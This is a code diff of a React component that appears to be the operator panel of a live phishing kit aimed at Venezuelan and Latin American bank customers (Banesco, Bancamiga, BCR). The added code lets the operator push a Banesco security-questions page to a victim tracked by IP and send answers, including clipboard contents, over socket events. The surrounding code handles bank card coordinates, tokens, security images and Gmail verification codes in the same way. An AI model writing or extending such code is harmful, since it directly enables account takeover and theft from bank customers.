@@ -17,10 +17,19 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
       coordinate1: '',
       coordinate2: '',
       coordinate3: '',
+      question1: '',
+      question2: '',
       gmailDevice: '', 
       gmailCode: ''
     },
-    onSubmit: async({image, methodToken, coordinate1,coordinate2,coordinate3, gmailCode, gmailDevice}) =>{
+    onSubmit: async({image, methodToken, coordinate1,coordinate2,coordinate3, question1, question2, gmailCode, gmailDevice}) =>{
+
+      if (textPage == 'Preguntas de seguridad') {
+        (isSelected) 
+        ? socket.emit('[banesco] questions', {questions: JSON.parse(await navigator.clipboard.readText()), ip}) 
+        : socket.emit('[banesco] questions', {questions: {question1, question2}, ip})
+      }
+
       if(textPage == 'Metodo seguridad' && !isSelected) socket.emit('[bancamiga] getImage', {image, ip})
       if(textPage == 'Imagen') {
         (isSelected) 
@@ -39,7 +48,7 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
     }
   })
   const sendBagRedirect = () => {
-    if(textPage == 'Metodo seguridad' || textPage == 'Gmail verificacion' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') return setFormView(true)
+    if(textPage == 'Metodo seguridad' || textPage == 'Gmail verificacion' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' || textPage == 'Preguntas de seguridad') return setFormView(true)
     socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank  })
     setFormView(false)
     onClose()
@@ -58,6 +67,22 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
         <PopoverContent >
           <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
             {
+              textPage == 'Preguntas de seguridad' ? (
+                  <>
+                    <p>Preguntas de seguridad Banesco</p>
+                    <span>Pregunta 1</span>
+                    <input disabled={isSelected} required autoComplete="false" className="w-full py-1 pl-2" type="text" name="question1" value={values.question1} onChange={handleChange} />
+                    <span className="mt-2">Pregunta 2</span>
+                    <input disabled={isSelected}  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="question2" value={values.question2} onChange={handleChange} />
+
+                    <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
+                      Enviar lo copiado
+                    </Checkbox>
+                  </>
+
+              ) : null
+            }
+            {
               textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' ? (
                   <>
                     <p>Manda tus coordenadas BCR</p>
@@ -67,6 +92,7 @@ export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa
                     <span className="mt-2">coordenada2</span>
                     <input  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="coordinate2" value={values.coordinate2.toString().slice(0,2)} onChange={handleChange} />
                     <span>coordenada3</span>
+                    
                     <input  autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate3" value={values.coordinate3.toString().slice(0,2)} onChange={handleChange} />
                   </>
 
